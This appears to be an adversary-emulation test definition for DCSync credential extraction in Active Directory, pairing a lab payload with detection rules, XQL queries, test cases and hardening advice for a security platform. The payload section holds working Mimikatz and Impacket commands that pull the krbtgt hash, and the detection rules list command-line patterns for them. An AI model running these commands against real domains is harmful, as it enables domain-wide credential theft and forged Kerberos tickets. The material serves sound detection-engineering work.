identity.name: DCSync — Domain Replication Abuse for Credential Extraction (T1003.006)
identity.summary: An attacker holding an account with DS-Replication-Get-Changes / DS-Replication-Get-Changes-All extended rights (or a compromised domain controller computer account) issues an MS-DRSR GetNCChanges replication request to a domain controller and harvests password hashes for any AD principal — including krbtgt, which enables forging unrestricted Kerberos golden tickets.
identity.description: DCSync is the highest-impact credential access primitive in Active Directory. Unlike LSASS dumping (TTP-2026-0002) which requires presence on an endpoint, DCSync is performed remotely from any host the attacker controls once they hold the requisite replication rights. In the Unit 42 BlackSuit Blitz incident, Ignoble Scorpius extracted password hashes from compromised domain controllers as the pivot to enterprise-wide encryption. Mimikatz `lsadump::dcsync` and Impacket `secretsdump.py` are the canonical implementations; both generate distinctive DRSR (DRSUAPI) RPC traffic over TCP/135 + dynamic high ports that Cortex XDR Network Analytics + the Identity Threat Module surface. Chains directly downstream of TTP-2026-0002 (LSASS dump → credential reuse) and upstream of TTP-2026-0006 (mass encryption).

data_sources: Active Directory: Active Directory Object Access

execution.framework_reference_id: T1003.006 — Atomic Test #1 (DCSync via Mimikatz) / Atomic Test #2 (Invoke-DCSync via PowerShell)

prerequisites.description: Lab Active Directory domain with at least one writable DC and a designated 'attacker' account that has been granted Replicating Directory Changes + Replicating Directory Changes All on the domain object.
prerequisites.remediation: Grant the rights via PowerView Add-DomainObjectAcl or dsacls.exe (lab only). Do NOT run against production AD.

prerequisites.description: Mimikatz binary or Impacket suite available on the attacker host.

payload.code:
# Atomic Test variant — DCSync krbtgt via Mimikatz from a non-DC host.
# Run as the user holding DS-Replication-Get-Changes-All.
$dc      = "${TARGET_DC_FQDN}"
$domain  = "${TARGET_DOMAIN_DN}"
$account = "krbtgt"

# Mimikatz lsadump::dcsync
& "C:\tools\mimikatz\x64\mimikatz.exe" `
  "privilege::debug" `
  "lsadump::dcsync /domain:${domain} /user:${account} /dc:${dc}" `
  "exit"

# OR — Impacket equivalent (run from a Linux box):
#   secretsdump.py -just-dc-user ${account} ${DOMAIN}/${ATTACKER_USER}:${ATTACKER_PASS}@${TARGET_DC_FQDN}

input_variables.name: TARGET_DC_FQDN
input_variables.description: FQDN of the lab domain controller (e.g., dc01.lab.local).

input_variables.name: TARGET_DOMAIN_DN
input_variables.description: Distinguished name of the lab domain (e.g., lab.local).

expected_artifacts.description: mimikatz.exe spawned with `lsadump::dcsync` command line, or Impacket Python process.
DRSUAPI RPC traffic from non-DC host to DC (TCP/135 + dynamic high port).
expected_artifacts.expected_value: dst_port = 135 OR (dst_host = DC AND rpc_uuid = E3514235-4B06-11D1-AB04-00C04FC2DCD2)

expected_artifacts.description: Windows Security Event 4662 on DC: object access with property `Replicating Directory Changes` from a non-DC principal.
expected_artifacts.expected_value: EventID=4662 AND Properties CONTAINS '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' AND SubjectUserName NOT_IN domain_controller_accounts

cleanup.code:
# Roll the krbtgt password TWICE (24h apart) if a real DCSync occurred.
# In a lab, immediately rotate to invalidate any harvested hash.
Reset-ADKrbtgtPassword -ErrorAction SilentlyContinue
# Wait 10s for replication, rotate again:
Start-Sleep -Seconds 10
Reset-ADKrbtgtPassword -ErrorAction SilentlyContinue
manual_steps: Confirm all DCs replicated the new krbtgt hash before considering golden-ticket risk neutralized.
Audit the attacker account's group membership; revoke replication rights post-test.

biocs.name: DRSUAPI Replication Request From Non-DC Host
biocs.description: A host that is NOT a domain controller initiates a DRSUAPI (MS-DRSR) RPC call to a DC requesting directory changes — the network signature of DCSync.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.NETWORK
| filter event_sub_type = ENUM.NETWORK_RPC
| filter rpc_interface_uuid = "e3514235-4b06-11d1-ab04-00c04fc2dcd2"
| filter rpc_opnum in (0,3)  // DRSBind, DRSGetNCChanges
| filter dst_host in (active_directory.domain_controllers)
| filter src_host not in (active_directory.domain_controllers)

biocs.name: Windows Event 4662 — Replicating Directory Changes by Non-DC Principal
biocs.description: DC audit log shows access to the directory replication GUID by a principal that is not a DC computer account.
biocs.logic:
dataset = msft_windows_security
| filter event_id = 4662
| filter properties contains "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
| filter subject_user_name not_match "^[A-Z0-9-]+\\$$"  // strip computer accounts
| filter subject_user_name not in (active_directory.dc_computer_accounts)

biocs.name: Mimikatz dcsync Command-Line Pattern
biocs.description: Process start with command line containing `dcsync` or `lsadump::dcsync`.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_command_line contains_any ("dcsync", "lsadump::dcsync")

xql_queries.name: Confirm DRSUAPI replication request seen from non-DC in last 30m
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.NETWORK and event_sub_type = ENUM.NETWORK_RPC
| filter rpc_interface_uuid = "e3514235-4b06-11d1-ab04-00c04fc2dcd2"
| fields _time, src_host, dst_host, rpc_opnum, src_user_name

xql_queries.name: Confirm 4662 replication event on DC
xql_queries.query:
dataset = msft_windows_security
| filter _time > to_timestamp(current_time() - 1800)
| filter event_id = 4662 and properties contains "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
| fields _time, hostname, subject_user_name, object_name

xql_queries.name: Accounts granted replication rights in last 30d (latent DCSync risk)
xql_queries.query:
dataset = msft_windows_security
| filter event_id in (5136, 4670)
| filter attribute_ldap_display_name in ("nTSecurityDescriptor")
| filter properties contains_any ("Replicating Directory Changes", "DS-Replication-Get-Changes")
| fields _time, subject_user_name, target_user_name

correlation_rules.name: Credential Access — DCSync Detected
correlation_rules.logic: BIOC(DRSUAPI Replication Request From Non-DC Host) OR BIOC(Windows Event 4662 — Replicating Directory Changes by Non-DC Principal) OR BIOC(Mimikatz dcsync Command-Line Pattern)

correlation_rules.name: Credential Access — Chained LSASS + DCSync Within 4h
correlation_rules.logic: CR-CRED-0001 (LSASS dump) AND CR-CRED-0002 (DCSync) on same actor within 4h — promotes to Critical incident with auto-isolation.

analytics_modules: Cortex XDR Identity Threat Module — DCSync detection
Cortex XSIAM Analytics — anomalous AD replication

products.evidence_query: Playbook: DCSync Response — disable attacker account, snapshot DC, rotate krbtgt 2x, isolate source host.
App-ID logs: msrpc traffic from non-DC subnet to DC subnet with replication UUID.

use_cases.name: Ransomware Kill-Chain Disruption — Domain-Wide Credential Theft Stage
use_cases.description: Detect DCSync as the high-impact pivot from local credential theft (TTP-2026-0002) to domain-wide compromise that enables mass encryption (TTP-2026-0006).

test_cases.objective: Cortex XDR Identity Threat Module raises a Critical incident on the DCSync attempt within 2 minutes of the replication request.
preconditions: Cortex XDR agents installed on lab DCs and the attacker host.
Identity Threat Module licensed and enabled.
Lab AD is replicating Security log to XSIAM (or XDR analytics is parsing 4662).
steps: Run TTP-2026-0004 payload from the attacker host targeting krbtgt.
Wait up to 2 minutes; observe XDR Incidents.
Open the alert and confirm the timeline shows DRSUAPI traffic + 4662 event.
success_criteria: Incident `XDR-IDENT-DCSYNC-001` created with severity Critical within 2m.
Timeline groups: process exec on attacker host + network RPC to DC + 4662 on DC.
BIOC `DRSUAPI Replication Request From Non-DC Host` fires.
XQL validation returns ≥1 row in both `xdr_data` and `msft_windows_security`.

test_cases.objective: Chained correlation rule fires when DCSync follows LSASS dump (TTP-2026-0002) within 4 hours.
preconditions: Run TTP-2026-0002 first; observe credential-theft alert.
success_criteria: Correlation `CR-CRED-0003` raises a unified Critical incident referencing both alerts.
Incident War Room shows both attack stages on a single timeline.

test_cases.objective: XSOAR auto-response rotates krbtgt and isolates the attacker host.
success_criteria: krbtgt password reset action logged (via PowerShell over WinRM to a designated PDC emulator).
Endpoint Isolation applied to attacker host within 90s.

preventive_controls: Tier 0 isolation: separate domain admin accounts; deny interactive logon to T1/T2 assets.
Audit and minimize `Replicating Directory Changes` and `Replicating Directory Changes All` grantees — should be only DCs + designated sync services.
Enable Protected Users group for privileged accounts.
Schedule routine krbtgt password rotation (twice, 24h apart) as part of hygiene.
Network segmentation: DCs reachable from a narrow admin subnet only.
detection_engineering: Inventory accounts with replication rights weekly; alert on any change.
Alert on DRSUAPI traffic from any host not in the DC computer-accounts set.
Forward DC Security log to XSIAM and write an analytics rule on Event 4662 with the replication GUID.
After detection, hunt for golden-ticket usage (TGTs with unusually long lifetimes; logon types from non-DC sources).

references.title: Anatomy of an Attack: The 'BlackSuit Blitz' at a Global Equipment Manufacturer
MS-DRSR: Directory Replication Service (DRS) Remote Protocol
